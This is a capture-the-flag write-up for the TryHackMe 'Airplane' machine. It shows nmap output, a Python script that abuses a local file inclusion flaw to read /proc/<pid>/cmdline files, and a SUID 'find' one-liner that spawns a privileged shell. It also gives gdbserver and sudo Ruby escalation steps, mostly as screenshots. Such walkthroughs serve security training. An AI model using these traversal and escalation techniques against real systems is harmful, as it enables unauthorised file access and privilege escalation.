---
title: Airplane TryHackMe
date: 19-07-2024
categories: [tryhackme,writeup]
tags: [scripting,gdbserver,SUID Permission,ruby]
---

# Airplane

Airplane is a medium-difficulty machine on TryHackMe. It begins with an LFI (Local File Inclusion) vulnerability, allowing us to enumerate server processes through /proc/cmdline. This leads us to a gdbserver service, which we exploit to gain initial access. Once inside as the user Hudson, we discover a file with SUID permissions belonging to Carlos. We use this to escalate privileges to Carlos's shell. Additionally, we find that Ruby scripts can be executed with sudo, which we abuse via directory traversal to execute our own code.

## **Recon**
---

We start with NMAP scan.

```bash
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE=
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8=
|   256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb
8000/tcp open  http-alt syn-ack Werkzeug/3.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Fri, 19 Jul 2024 14:43:19 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Fri, 19 Jul 2024 14:43:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=7/19%Time=669A7B81%P=x86_64-pc-linux-gnu%r
```

The web application on port 8000 have GET Parameter that vulnerable to Local File Inclusion(LFI). Below shows that '/etc/passwd' can be read thru the GET Parameter.

![alt text](/assets/img/airplane/image.png)

We can leverage the vulnerability to explore more about the server. This includes searching for any private keys within user home directories or sensitive information in the root folder. Unfortunately, these attempts did not yield any useful results. However, Local File Inclusion (LFI) is a significant vulnerability that allows an attacker to read, include, or execute files on the application server. By examining the Linux system files, we can gather valuable information about the server environment.

![alt text](/assets/img/airplane/image-1.png)

The LFI vulnerability reveals Hudson's home directory, which we already identified through /etc/passwd. A crucial file to check when encountering LFI is /proc/cmdline. This file can help us enumerate the server's processes. Below is a crafted script to automate this enumeration:

```python
import requests

url = "http://airplane.thm:8000/"

# ID in /proc/cmdline
with open("result.txt","w") as f:
    for i in range(1,1000):
        x = requests.get("{}?page=../../../../../..//proc/{}/cmdline".format(url,i))
        if x.text not in "Page not found":
            print(f"[+] Try {i} : " + x.text)
            print("[+] Saving output")
            f.write(f"Output for {i}:\n")
            f.write(x.text)
            f.write("\n\n")
```

Below shows that a GDBServer have been run in port 6048 and the PID for the /proc/cmdline is 530. We can use this information to enumerate more about the GDBServer.

![alt text](/assets/img/airplane/image-2.png)

We can search for GDBServer hacktricks or exploit. After validate all the found resource we can see that a way to upload a craft elf file to get the foothold. We can follow the step thru the hacktricks [blogs](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver#upload-and-execute). Below is the way we can do it to gain the foothold.

![alt text](/assets/img/airplane/image-3.png)

## **Hudson Shell**
---

Use the find command to list all the SUID file in the host server. We found the **find** binary file have the SUID Permission hence we can abuse it to escalate to other user.

![alt text](/assets/img/airplane/image-4.png)

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

## **Carlos Shell**
---

![alt text](/assets/img/airplane/image-5.png)

We discovered that the user Carlos can run a Ruby (.rb) file with sudo without requiring a password. To bypass the restrictions on the Ruby file, we can use directory traversal to execute our own code. Here is the Proof Of Concept to gain root privileges:

![alt text](/assets/img/airplane/image-6.png)

We gain root and pwn all the user. Thank you for reading :)
